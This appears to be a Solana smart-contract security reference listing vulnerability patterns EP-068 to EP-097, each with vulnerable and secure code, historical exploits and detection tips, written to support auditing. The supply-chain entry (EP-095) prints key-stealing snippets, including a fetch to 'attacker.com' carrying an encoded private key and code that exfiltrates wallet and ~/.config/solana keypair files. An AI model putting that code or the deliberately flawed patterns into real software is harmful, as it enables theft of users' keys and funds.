# Solana Exploit Patterns — Advanced (EP-068 to EP-097)
<!-- Part 2 of 4: Operational patterns, advanced bypass techniques -->
<!-- See also: exploit-patterns-core.md, exploit-patterns-incidents.md, exploit-patterns-recent.md -->
<!-- Full index: exploit-patterns-index.md -->
<!-- Last updated: 2026-02-06 -->

## Categories in This File
9. [Key Management](#key-management) (EP-068 to EP-074)
10. [Initialization](#initialization) (EP-075 to EP-078)
11. [Upgrade / Governance](#upgrade--governance) (EP-079 to EP-083)
12. [Resource / DoS](#resource--dos) (EP-084 to EP-088)
13. [Race Conditions / MEV](#race-conditions--mev) (EP-089 to EP-090)
14. [Wave 2: Advanced Patterns](#wave-2-advanced-patterns) (EP-091 to EP-097)

---

## Key Management

### EP-068: Single Admin Key
**Category:** Key Management  **Severity:** CRITICAL  **Solana-Specific:** No
**Historical Exploits:** Raydium ($4.4M, Dec 2022), MonkeyBall ($250K, Feb 2022)

**Description:** Critical ops controlled by single private key. Compromise = full control.

**Vulnerable Pattern:**
```rust
#[account(constraint = pool.admin == admin.key())]
pub admin: Signer<'info>, // Single key!
```
**Secure Pattern:**
```rust
pub admin_multisig: Signer<'info>, // Squads multisig
// + withdrawal limits + rate limiting + events
```
**Detection:** Check admin is multisig. Verify timelocks on critical ops.

---

### EP-069: No Admin Key Rotation
**Category:** Key Management  **Severity:** HIGH  **Solana-Specific:** No
**Historical Exploits:** Protocols with permanently compromised admin

**Description:** Authority set at init with no update function. Compromise is permanent.

**Vulnerable Pattern:**
```rust
pub fn initialize(ctx: ...) { config.authority = auth.key(); }
// No update_authority function!
```
**Secure Pattern:**
```rust
pub fn transfer_authority(ctx: ...) { config.pending = Some(new); }
pub fn accept_authority(ctx: ...) { config.authority = new.key(); config.pending = None; }
```
**Detection:** Verify authority update with two-step transfer pattern exists.

---

### EP-070: Sensitive Data in Logs
**Category:** Key Management  **Severity:** HIGH  **Solana-Specific:** No
**Historical Exploits:** Slope Wallet ($8M, Aug 2022)

**Description:** Seeds, keys, or secrets logged via `msg!()`. On-chain logs are public.

**Vulnerable Pattern:**
```rust
msg!("Seed: {:?}", seed); // Visible in logs!
```
**Secure Pattern:**
```rust
msg!("Account initialized for: {}", owner.key()); // Public info only
```
**Detection:** Search `msg!` for sensitive params. Review client-side logging.

---

### EP-071: Unprotected Upgrade Authority
**Category:** Key Management  **Severity:** CRITICAL  **Solana-Specific:** Yes
**Historical Exploits:** OptiFi ($661K, Sep 2022) - accidental program close

**Description:** Program upgrade authority is single keypair. `program close` is irreversible.

**Vulnerable Pattern:**
```bash
solana program deploy --upgrade-authority keypair.json # Single key!
```
**Secure Pattern:**
```bash
solana program set-upgrade-authority <PROG> --new-upgrade-authority <MULTISIG>
# Or: solana program set-upgrade-authority <PROG> --final
```
**Detection:** Check upgrade authority is multisig or immutable.

---

### EP-072: No Emergency Pause
**Category:** Key Management  **Severity:** MEDIUM  **Solana-Specific:** No
**Historical Exploits:** Protocols unable to halt during active exploits

**Description:** No way to pause operations during exploit. Drainage continues during fix.

**Vulnerable Pattern:**
```rust
pub fn deposit(ctx: ...) { /* always executable */ }
```
**Secure Pattern:**
```rust
require!(!config.paused, ErrorCode::Paused);
// Authority can toggle config.paused
```
**Detection:** Check for pause mechanism on critical operations.

---

### EP-073: Excessive Admin Privileges
**Category:** Key Management  **Severity:** HIGH  **Solana-Specific:** No
**Historical Exploits:** Raydium pool drainage, Marinade commission changes

**Description:** Admin has unlimited withdrawals and instant parameter changes with no caps or delays.

**Vulnerable Pattern:**
```rust
pub fn admin_withdraw(ctx: ..., amount: u64) { transfer(amount)?; } // No limit!
```
**Secure Pattern:**
```rust
require!(amount <= MAX_PER_TX);
require!(clock.slot - last_withdraw > MIN_DELAY);
emit!(AdminWithdrawEvent { amount, slot });
```
**Detection:** List admin functions. Verify limits, rate limiting, events.

---

### EP-074: No Timelock on Parameter Changes
**Category:** Key Management  **Severity:** HIGH  **Solana-Specific:** No
**Historical Exploits:** Marinade commission changes, Bonfida governance dispute

**Description:** Critical parameter changes (fees, authorities) take effect immediately.

**Vulnerable Pattern:**
```rust
pub fn set_fee(ctx: ..., fee: u64) { pool.fee = fee; } // Instant!
```
**Secure Pattern:**
```rust
pool.pending_fee = Some(fee);
pool.fee_change_slot = clock.slot + TIMELOCK; // e.g., 3 days
// Separate execute after timelock expires
```
**Detection:** Find parameter changes. Verify timelock delays.

---

## Initialization

### EP-075: Double Initialization
**Category:** Initialization  **Severity:** HIGH  **Solana-Specific:** Yes
**Historical Exploits:** Config accounts overwritten by second caller

**Description:** Init function callable multiple times, overwriting authority/params.

**Vulnerable Pattern:**
```rust
#[account(mut)] pub config: Account<'info, Config>, // Re-initable!
```
**Secure Pattern:**
```rust
#[account(init, payer = payer, space = 8 + Config::LEN)] // Fails if exists
```
**Detection:** Check init functions for `init` constraint or `is_initialized` flag.

---

### EP-076: Front-Runnable Init / Pre-Funding DoS
**Category:** Initialization  **Severity:** HIGH  **Solana-Specific:** Yes
**Historical Exploits:** PDA accounts front-run initialized by attacker; Pre-funding DoS (attacker sends lamports to predictable PDA before legitimate init)

**Description:** Two sub-patterns:
1. **Front-run init:** Init tx visible in mempool. Attacker front-runs with their authority.
2. **Pre-funding DoS:** Attacker pre-funds a predictable PDA with lamports. `create_account` checks `lamports > 0` and fails with `AccountAlreadyInUse`, permanently blocking initialization. Anchor mitigates this (falls back to `transfer` + `allocate` + `assign`), but raw `invoke_signed` with `create_account` is vulnerable.

**Vulnerable Pattern:**
```rust
pub fn init(ctx: ...) { config.authority = authority.key(); } // Front-runnable!

// Pre-funding DoS variant:
invoke_signed(
    &system_instruction::create_account(payer, pda, rent, space, program_id),
    &[payer, pda, system_program],
    &[seeds], // FAILS if pda already has lamports > 0
)?;
```
**Secure Pattern:**
```rust
#[account(init, seeds = [b"config", DEPLOYER.as_ref()], bump)]
pub config: Account<'info, Config>, // Deployer-specific PDA + Anchor handles pre-funding

// Manual safe init (if not using Anchor):
if pda.lamports() > 0 {
    // Account already has lamports — use allocate + assign instead
    let needed_rent = rent.minimum_balance(space) - pda.lamports();
    if needed_rent > 0 { invoke(&transfer(payer, pda, needed_rent), ...)?; }
    invoke_signed(&allocate(pda, space), ..., &[seeds])?;
    invoke_signed(&assign(pda, program_id), ..., &[seeds])?;
} else {
    invoke_signed(&create_account(payer, pda, rent, space, program_id), ..., &[seeds])?;
}
```
**Detection:** Check if init uses raw `create_account` with predictable PDA (vulnerable to pre-funding). Check if init can be front-run. Verify PDA seeds prevent unauthorized init. Anchor's `init` is safe; raw `invoke_signed` with `create_account` is not.

---

### EP-077: Incomplete Field Init
**Category:** Initialization  **Severity:** MEDIUM  **Solana-Specific:** Yes
**Historical Exploits:** Vaults leaking previous owner data

**Description:** Only some fields initialized. Uninitialized contain garbage from previous account.

**Vulnerable Pattern:**
```rust
vault.authority = auth.key(); vault.balance = 0;
// vault.last_updated NOT SET - garbage!
```
**Secure Pattern:**
```rust
vault.initialize(auth.key(), clock.unix_timestamp); // ALL fields
```
**Detection:** Review struct init. Verify ALL fields set. Use Default trait.

---

### EP-078: Pool Init Without Launch Delay
**Category:** Initialization  **Severity:** LOW  **Solana-Specific:** No
**Historical Exploits:** Meme coin sniping on Raydium/Orca

**Description:** New pool immediately tradeable. Bots snipe initial liquidity.

**Vulnerable Pattern:**
```rust
pool.is_active = true; // Tradeable instantly!
```
**Secure Pattern:**
```rust
pool.is_active = false;
pool.launch_slot = clock.slot + DELAY;
pool.max_buy = initial_reserve / 100; // 1% cap initially
```
**Detection:** Check pool init. Verify launch delay and fair launch.

---

## Upgrade / Governance

### EP-079: Governance Voting Period Manipulation
**Category:** Upgrade  **Severity:** HIGH  **Solana-Specific:** No
**Historical Exploits:** Solend governance incident (Jun 2022) - rushed vote

**Description:** No minimum voting period. Emergency proposals pass in hours.

**Vulnerable Pattern:**
```rust
proposal.voting_ends = clock.timestamp + period; // No minimum!
```
**Secure Pattern:**
```rust
let period = match proposal_type {
    Parameter => MIN_VOTING_PERIOD,      // 3 days
    Emergency => EMERGENCY_PERIOD,       // 24h with super-majority
};
proposal.voting_starts = clock.timestamp + REVIEW_PERIOD; // 24h review
```
**Detection:** Check minimum voting periods, review periods, timelocks.

---

### EP-080: No Quorum Requirement
**Category:** Upgrade  **Severity:** MEDIUM  **Solana-Specific:** No
**Historical Exploits:** Low-participation governance attacks

**Description:** Proposal passes with any majority, no minimum participation.

**Vulnerable Pattern:**
```rust
require!(yes_votes > no_votes); // 2 vs 1 sufficient!
```
**Secure Pattern:**
```rust
let total = yes + no;
require!(total * 100 >= possible * QUORUM_PCT);
require!(yes * 100 / total >= THRESHOLD);
```
**Detection:** Verify quorum requirements. Check super-majority for critical changes.

---

### EP-081: Immediate Proposal Execution
**Category:** Upgrade  **Severity:** HIGH  **Solana-Specific:** No
**Historical Exploits:** Governance flash loan attacks (Beanstalk-style)

**Description:** Proposal executable immediately after vote ends. No exit window.

**Vulnerable Pattern:**
```rust
require!(clock >= proposal.voting_ends); proposal.executed = true; // Instant!
```
**Secure Pattern:**
```rust
require!(clock >= proposal.timelock_ends); // Vote end + delay
require!(!guardian_veto.is_vetoed);
```
**Detection:** Verify timelock between vote end and execution. Check veto mechanisms.

---

### EP-082: No Voting Power Snapshot
**Category:** Upgrade  **Severity:** HIGH  **Solana-Specific:** No
**Historical Exploits:** Flash loan governance attacks

**Description:** Voting power based on current balance, not snapshot at proposal creation. Tokens borrowed to vote.

**Vulnerable Pattern:**
```rust
let power = voter.current_balance; // Current, not snapshot!
```
**Secure Pattern:**
```rust
let power = get_power_at_slot(voter, proposal.snapshot_slot)?;
require!(voter.deposit_slot + DELAY < proposal.snapshot_slot);
```
**Detection:** Check snapshot-based voting. Verify deposit delay.

---

### EP-083: Upgrade Without Notice
**Category:** Upgrade  **Severity:** HIGH  **Solana-Specific:** Yes
**Historical Exploits:** OptiFi accidental close ($661K)

**Description:** Program upgraded/closed with no advance notice. Users can't withdraw first.

**Vulnerable Pattern:**
```bash
solana program deploy new.so # No notice!
```
**Secure Pattern:**
```rust
state.pending_upgrade = Some(PendingUpgrade {
    buffer, grace_period_ends: clock.slot + 604800, // ~7 days
});
// Block new deposits during grace period
```
**Detection:** Verify upgrade procedures include notice period.

---

## Resource / DoS

### EP-084: Compute Unit Exhaustion
**Category:** DoS  **Severity:** MEDIUM  **Solana-Specific:** Yes
**Historical Exploits:** NFT verification DoS, airdrop registration DoS

**Description:** Unbounded computation exhausts 1.4M compute unit budget.

**Vulnerable Pattern:**
```rust
for sig in signatures { ed25519_verify(&sig)?; } // No limit on count!
```
**Secure Pattern:**
```rust
require!(signatures.len() <= MAX_SIGS);
```
**Detection:** Find unbounded loops. Verify input size validation before expensive ops.

---

### EP-085: Unbounded Iteration
**Category:** DoS  **Severity:** MEDIUM  **Solana-Specific:** Yes
**Historical Exploits:** Airdrop DoS via max user registration

**Description:** Iteration over unbounded Vec or remaining_accounts exhausts compute.

**Vulnerable Pattern:**
```rust
pub users: Vec<Pubkey>, // Unbounded!
for user in users { update(user)?; }
```
**Secure Pattern:**
```rust
pub users: [Pubkey; MAX], // Fixed
pub fn update_batch(start: u32, count: u32) { require!(count <= MAX_BATCH); }
```
**Detection:** Find loops over Vec or remaining_accounts. Verify batch limits.

---

### EP-086: Stack Overflow
**Category:** DoS  **Severity:** MEDIUM  **Solana-Specific:** Yes (4KB stack)
**Historical Exploits:** NFT programs crash on nested metadata

**Description:** Deep recursion or CPI chains exhaust 4KB BPF stack.

**Vulnerable Pattern:**
```rust
fn process(node: &AccountInfo) { for child in children { process(&child)?; } }
```
**Secure Pattern:**
```rust
let mut stack = vec![(node, 0)]; // Heap iteration
while let Some((n, depth)) = stack.pop() { require!(depth <= MAX); }
```
**Detection:** Find recursive functions. Verify depth limits. Prefer iteration.

---

### EP-087: Heap Exhaustion
**Category:** DoS  **Severity:** MEDIUM  **Solana-Specific:** Yes (32KB heap)
**Historical Exploits:** Metadata programs failing on large blobs

**Description:** User-controlled input causes large heap allocations, exhausting 32KB.

**Vulnerable Pattern:**
```rust
let mut buf = Vec::with_capacity(data.len() * 2); // Could be huge!
```
**Secure Pattern:**
```rust
require!(data.len() <= MAX_SIZE);
// Use fixed-size buffers or zero_copy accounts
```
**Detection:** Find `Vec::with_capacity()`. Verify size validation before allocation.

---

### EP-088: Borsh Deserialization Bomb
**Category:** DoS  **Severity:** HIGH  **Solana-Specific:** Yes
**Historical Exploits:** Programs DoS'd by oversized serialized vectors

**Description:** Borsh deserializes unbounded Vec/String/HashMap from untrusted data, causing OOM.

**Vulnerable Pattern:**
```rust
#[derive(BorshDeserialize)]
pub struct Data { pub items: Vec<Item>, pub name: String } // Unbounded!
```
**Secure Pattern:**
```rust
pub struct Data { pub items: [Item; 10], pub name: [u8; 32] } // Fixed
require!(data.len() <= MAX_SIZE);
```
**Detection:** Find `BorshDeserialize` with Vec/String/HashMap. Verify size checks.

---

## Race Conditions / MEV

### EP-089: Timestamp Manipulation
**Category:** Race Conditions  **Severity:** MEDIUM  **Solana-Specific:** Yes
**Historical Exploits:** Reward manipulation via validator drift, Synthetify ($120K, Jul 2021)

**Description:** Validators can manipulate Clock timestamp within ~30s. Financial calcs using timestamps are exploitable.

**Vulnerable Pattern:**
```rust
let reward = (clock.unix_timestamp - last_claim) as u64 * RATE; // Manipulable!
```
**Secure Pattern:**
```rust
let reward = (clock.slot - last_claim_slot) * RATE_PER_SLOT; // Slots are monotonic
```
**Detection:** Find `unix_timestamp` in financial logic. Prefer slot-based timing.

---

### EP-090: Simultaneous Operation Race
**Category:** Race Conditions  **Severity:** HIGH  **Solana-Specific:** No
**Historical Exploits:** Cyclos ($340K, Mar 2022), Hubble ($180K, Jul 2022)

**Description:** Withdraw + borrow in same tx batch. Health check after both = undercollateralized.

**Vulnerable Pattern:**
```rust
// Ix1: withdraw collateral. Ix2: borrow against it. Health check post-both.
```
**Secure Pattern:**
```rust
validate_health(user)?; // Before
execute_operation()?;
validate_health(user)?; // After each operation
```
**Detection:** Find composable operations. Verify per-operation health checks.

---

## Wave 2: Advanced Patterns

### EP-091: Custom Overflow Guard Bypass
**Category:** Arithmetic  **Severity:** CRITICAL  **Solana-Specific:** No (Move/Sui, but pattern applies to any chain)
**Historical Exploits:** Cetus DEX ($223M, May 2025 on SUI — pattern applicable to Solana)

**Description:** Custom overflow check function uses incorrect constant/threshold, allowing values that WILL overflow when shifted. Silent wrapping produces near-zero results, enabling near-free liquidity minting.

**Vulnerable Pattern:**
```rust
fn checked_shlw(value: u256) -> u256 {
    // BUG: Threshold too high — allows values that overflow when shifted
    assert!(value <= INCORRECT_MAX_THRESHOLD);
    value << 64  // Wraps silently!
}
fn get_delta_a(liquidity: u128, sqrt_price_a: u128, sqrt_price_b: u128) -> u64 {
    let numerator = checked_shlw(liquidity as u256 * delta as u256);
    // Overflow wraps numerator to ~1; division yields ~1 token needed
    let result = numerator / (sqrt_price_a as u256 * sqrt_price_b as u256);
    result as u64  // Returns 1 instead of massive required amount
}
```
**Secure Pattern:**
```rust
fn checked_shlw(value: u256) -> u256 {
    // CORRECT: Verify top 64 bits are zero before shifting left by 64
    assert!(value >> 192 == 0);
    value << 64
}
```
**Detection:** Search for custom bit-shift/overflow-check functions. Verify guard constants are mathematically correct. Check if language silently wraps (Move does, Rust panics). Audit third-party math libraries (e.g., `integer-mate`).

---

### EP-092: Deprecated Sysvar Account Injection
**Category:** Account Validation  **Severity:** CRITICAL  **Solana-Specific:** Yes
**Historical Exploits:** Wormhole ($326M, Feb 2022)

**Description:** Using `load_instruction_at` (deprecated) instead of `load_instruction_at_checked` allows attacker to pass a fake sysvar account pre-loaded with forged instruction data, bypassing signature verification.

**Vulnerable Pattern:**
```rust
let ix = load_instruction_at(
    0,
    &ctx.accounts.instruction_sysvar  // NOT validated as real sysvar!
)?;
verify_secp256k1_instruction(&ix)?;
```
**Secure Pattern:**
```rust
// Option 1: Use checked variant (validates sysvar address)
let ix = load_instruction_at_checked(0, &ctx.accounts.instruction_sysvar)?;
// Option 2: Explicit address check
require!(
    ctx.accounts.instruction_sysvar.key() == sysvar::instructions::ID,
    ErrorCode::InvalidSysvar
);
```
**Detection:** Grep for `load_instruction_at` without `_checked`. Check any sysvar account for explicit address validation. Review Secp256k1 verification paths.

---

### EP-093: Off-Chain TOCTOU / Race Condition
**Category:** Race Conditions  **Severity:** HIGH  **Solana-Specific:** No
**Historical Exploits:** Aurory SyncSpace ($830K, Dec 2023), The Heist ($NANA token price drop, date unknown — confirmed exploit in P2E game with Chimps/Gorillas/NANA economy)

**Description:** Off-chain API endpoint checks balance, then debits in separate non-atomic steps. Concurrent requests pass the check before any debit occurs, inflating balances. Common in hybrid P2E games where off-chain servers bridge to on-chain state.

**Vulnerable Pattern:**
```python
async def buy_item(user_id, item_id, amount):
    balance = await get_balance(user_id)         # Check
    if balance >= price * amount:
        await credit_item(user_id, item_id, amount)  # Act
        await debit_balance(user_id, price * amount)  # Debit
    # BUG: Between check and debit, concurrent requests pass the check!
```
**Secure Pattern:**
```python
async def buy_item(user_id, item_id, amount):
    async with database.transaction() as tx:
        balance = await tx.select_for_update("balances", user_id)  # Row lock
        if balance >= price * amount:
            await tx.credit_item(user_id, item_id, amount)
            await tx.debit_balance(user_id, price * amount)
        # Transaction commit = atomic
```
**Detection:** Review off-chain endpoints for balance check/debit separation. Test concurrent request handling. Check bridges between on-chain and off-chain state.

---

### EP-094: Bonding Curve Graduation Exploit
**Category:** Economic / DeFi  **Severity:** HIGH  **Solana-Specific:** Yes (memecoin launchpads)
**Historical Exploits:** Pump.fun ($1.9M, May 2024 — insider)

**Description:** When bonding curve reaches 100%, liquidity unlocks for DEX migration. Single-key withdrawal authority (especially if former employee has access) can hijack the unlocked funds via flash loans to force graduation.

**Vulnerable Pattern:**
```rust
pub fn migrate_to_dex(ctx: Context<Migrate>) -> Result<()> {
    require!(curve.progress == 100);
    // BUG: Single-key authority, no timelock, no multisig
    require!(ctx.accounts.authority.key() == curve.withdraw_authority);
    transfer_liquidity(curve)?;
    Ok(())
}
```
**Secure Pattern:**
```rust
pub fn migrate_to_dex(ctx: Context<Migrate>) -> Result<()> {
    require!(curve.progress == 100);
    require!(ctx.accounts.multisig.threshold_met());
    require!(Clock::get()?.unix_timestamp >= curve.proposed_at + TIMELOCK_SECONDS);
    create_dex_pool_directly(curve)?;  // Funds go to pool, not wallet
    Ok(())
}
```
**Detection:** Check bonding curve graduation/migration for single-key authority. Verify timelocks on liquidity movements. Audit fund routing (wallet vs. direct pool creation).

---

### EP-095: Supply Chain / Dependency Poisoning
**Category:** Supply Chain  **Severity:** CRITICAL  **Solana-Specific:** No (but @solana/web3.js was targeted)
**Historical Exploits:** @solana/web3.js ($130K, Dec 2024 — CVE-2024-54134), DogWifTools ($10M, Jan 2025 — RAT via GitHub), solana-pumpfun-bot (Jul 2025 — malicious npm pkg), PyPI semantic-types (Jan 2025 — monkey-patching Keypair)

**Description:** Attackers compromise the software supply chain through multiple vectors to steal private keys or inject malware into developer/user environments.

**Sub-Pattern SC-1: Package Registry Poisoning**
```javascript
// @solana/web3.js 1.95.6/1.95.7 — compromised npm maintainer account
function addToQueue(privateKey) {
    fetch('https://attacker.com', { headers: { 'x-amz-cf-id': encode(privateKey) } });
}
```

**Sub-Pattern SC-2: Fake Repository Impersonation**
```javascript
// solana-pumpfun-bot — fake GitHub repo with malicious dependency "crypto-layout-utils"
// Package removed from npm, hosted on attacker's GitHub repo
// Heavily obfuscated — scans for wallet files and uploads to attacker server
const fs = require('fs');
const walletFiles = glob.sync('**/*.json').filter(f => isWalletFile(f));
walletFiles.forEach(f => exfiltrate(fs.readFileSync(f)));
```

**Sub-Pattern SC-3: Build Pipeline Compromise**
```
// DogWifTools — attacker reverse-engineered binary, extracted GitHub token
// Used token to access private repo, injected RAT into versions 1.6.3-1.6.6
// RAT targeted: wallet private keys, exchange credentials, ID photos
// $10M+ drained from affected Windows users
```

**Sub-Pattern SC-4: Runtime Monkey-Patching**
```python
# PyPI semantic-types — monkey-patches solders Keypair class
# Distributed via: solana-keypair, solana-publickey, solana-mev-agent-py, etc.
original_init = Keypair.__init__
def malicious_init(self, *args, **kwargs):
    original_init(self, *args, **kwargs)
    # Encrypt stolen key with RSA-2048, exfiltrate via Solana memo transaction
    send_memo_tx(devnet_endpoint, rsa_encrypt(self.secret()))
Keypair.__init__ = malicious_init
```

**Sub-Pattern SC-5: Drainer-as-a-Service (DaaS)**
```
// CLINKSINK — Mandiant-tracked DaaS targeting Solana users
// Distribution: Fake airdrop phishing pages via X/Discord
// Lures: Phantom, DappRadar, BONK airdrops
// Flow: Connect wallet → sign tx → drainer siphons SOL + tokens
// Revenue split: Operator gets cut, affiliates get cut
// $900K+ stolen since Dec 2023
// Mandiant's own X account hijacked and used for distribution (Jan 2024)
```

**Sub-Pattern SC-6: Dev Environment Exfiltration**
```python
# PyPI "solana-live" (May 2025) — targets Solana dev environments
# 11 malicious packages, 4 iterations
# Targets: ~/.config/solana/ keypair files
# Final variant: exfiltrates Jupyter Notebook execution history + source code
# Exposes: API keys, crypto credentials in notebook cells
# Exfiltrated to Russian-hosted IPs
import os
solana_dir = os.path.expanduser("~/.config/solana/")
for f in os.listdir(solana_dir):
    exfiltrate(os.path.join(solana_dir, f))
# Also scrapes Jupyter history for secrets
```

**Secure Patterns:**
- Lock dependency versions with lockfiles (`package-lock.json`, `yarn.lock`, `Cargo.lock`)
- Use `npm audit`, `cargo audit`, Socket.dev, and Snyk for supply chain monitoring
- Never handle private keys in frontend code
- Enable package signing and verify checksums
- Monitor for unexpected version publications on critical packages
- Never embed API tokens or credentials in distributed binaries
- Verify repository authenticity (stars/forks can be faked)
- Use code signing for release binaries
- Pin dependencies to exact versions, not ranges
- Never connect wallets to unverified airdrop sites (DaaS defense)
- Use hardware wallets for high-value holdings (immune to most drainers)
- Protect dev environments: don't install unvetted Solana-related packages

**Detection:** Audit dependency update diffs. Check for unexpected network calls in node_modules. Verify npm/PyPI package checksums. Monitor critical package publication events. Check for embedded tokens in compiled binaries (`strings` analysis). Verify dependency sources are official registries, not GitHub repos. For DaaS: flag any airdrop claim that requires transaction signing (legitimate airdrops don't drain wallets). For dev env: audit Solana-related PyPI/npm packages against known-good lists.

**Sub-Pattern SC-7: Third-Party Staking/DeFi API Poisoning**
```
// SwissBorg/Kiln (Sep 2025) — $41.5M stolen
// Attacker compromised Kiln infra engineer's GitHub access token
// Injected malicious payload into Kiln Connect API (staking-as-a-service)
// During routine "deactivate" (unstake) transaction, malicious code added
//   8 hidden authorization instructions that transferred stake account
//   control from SwissBorg to attacker-controlled on-chain accounts
// Targeted organizations holding >150,000 SOL
// 192,600 SOL drained after stake authority silently transferred
```

**Sub-Pattern SC-8: Blockchain-as-C2 Infrastructure**
```
// GlassWorm (Feb 2026) — Open VSX supply chain attack
// Malware loader distributed via compromised developer accounts on Open VSX Registry
// Novel: uses Solana memo transactions as a dynamic dead-drop to rotate
//   staging infrastructure without republishing malicious extensions
// Attacker writes C2 URLs as Solana memos → malware reads memos on-chain
// Blends into normal developer workflows, encrypted runtime-decrypted loaders
```

**Secure Patterns:**
- Lock dependency versions with lockfiles (`package-lock.json`, `yarn.lock`, `Cargo.lock`)
- Use `npm audit`, `cargo audit`, Socket.dev, and Snyk for supply chain monitoring
- Never handle private keys in frontend code
- Enable package signing and verify checksums
- Monitor for unexpected version publications on critical packages
- Never embed API tokens or credentials in distributed binaries
- Verify repository authenticity (stars/forks can be faked)
- Use code signing for release binaries
- Pin dependencies to exact versions, not ranges
- Never connect wallets to unverified airdrop sites (DaaS defense)
- Use hardware wallets for high-value holdings (immune to most drainers)
- Protect dev environments: don't install unvetted Solana-related packages
- **Vet third-party staking/DeFi API providers:** require multisig for authority transfers, monitor on-chain authority changes, implement allowlisting for stake account operations

**Detection:** Audit dependency update diffs. Check for unexpected network calls in node_modules. Verify npm/PyPI package checksums. Monitor critical package publication events. Check for embedded tokens in compiled binaries (`strings` analysis). Verify dependency sources are official registries, not GitHub repos. For DaaS: flag any airdrop claim that requires transaction signing (legitimate airdrops don't drain wallets). For dev env: audit Solana-related PyPI/npm packages against known-good lists. For staking APIs: verify authority transfer instructions cannot be injected into routine operations; monitor for unexpected `SetAuthority` calls on stake accounts.

**Sources (Wave 6):** Mandiant CLINKSINK report (Jan 2024), Cyble Solana Drainer analysis (Feb 2025), Socket.dev 2025 threat report
**Sources (Wave 10):** SwissBorg/Kiln post-mortem (Nov 2025, swissborg.com), Halborn SwissBorg analysis (Sep 2025), TheHackerNews GlassWorm report (Feb 2026)

---

### EP-096: Exotic Collateral Oracle Manipulation
**Category:** Oracle  **Severity:** HIGH  **Solana-Specific:** No
**Historical Exploits:** Loopscale ($5.8M, Apr 2025 — RateX PT tokens)

**Description:** Protocol accepts novel token types (Principal Tokens, Yield Tokens, wrapped derivatives) as collateral but uses a pricing function that can be manipulated. The composability gap between the token issuer's oracle and the lending protocol's integration creates pricing vulnerabilities.

**Vulnerable Pattern:**
```rust
// Custom pricing for exotic collateral — manipulable
let pt_value = custom_price_function(rate_x_pt_account)?;
let borrowable = pt_value * LTV_RATIO;
// BUG: Custom pricing can be gamed; no circuit breaker
```
**Secure Pattern:**
```rust
let pt_value = custom_price_function(rate_x_pt_account)?;
// Cross-reference with independent oracle
let reference_price = get_independent_oracle_price(pt_mint)?;
require!(
    (pt_value as i128 - reference_price as i128).abs() < MAX_DEVIATION,
    ErrorCode::PriceDeviation
);
// Circuit breaker: pause if collateral value changes > X% in one block
require!(
    price_change_ratio(pt_mint, pt_value) < CIRCUIT_BREAKER_THRESHOLD,
    ErrorCode::CircuitBreakerTripped
);
```
**Detection:** Identify exotic/novel collateral types. Audit custom pricing functions for manipulation vectors. Check for circuit breakers on collateral value changes. Verify independent oracle cross-references.

---

### EP-097: Plaintext Key Storage / Transmission
**Category:** Key Management  **Severity:** CRITICAL  **Solana-Specific:** No
**Historical Exploits:** DEXX ($30M, Nov 2024), Slope Wallet ($8M, Aug 2022)

**Description:** Private keys stored in plaintext on servers, logged to monitoring services, or transmitted unencrypted. Server breach or log access exposes all user funds at once.

**Vulnerable Pattern:**
```javascript
// DEXX: Plaintext key storage on server
db.users.insert({ wallet: pubkey, private_key: secretKey });  // PLAINTEXT!
// Slope: Key logged to Sentry
Sentry.captureMessage(`Wallet created: ${secretKeyBase58}`);
// DEXX: export_wallet returned plaintext
app.get('/export_wallet', (req, res) => res.json({ private_key: user.secretKey }));
```
**Secure Pattern:**
```javascript
// Encrypt at rest with per-user key derived from password
const encryptedKey = await encrypt(secretKey, deriveKey(userPassword, salt));
db.users.insert({ wallet: pubkey, encrypted_key: encryptedKey, salt });
// NEVER log keys — use structured logging with allowlists
logger.info({ event: 'wallet_created', pubkey });  // No secret data
// Better: non-custodial — never hold user keys
```
**Detection:** Search for `private_key`, `secret_key`, `secretKey` in storage/logging code. Check key export endpoints. Verify encryption at rest for any stored key material. Check monitoring service configs (Sentry, Datadog) for key exposure.

---

<!-- END: exploit-patterns-advanced.md | EP-068 to EP-097 | Categories 9-14 -->
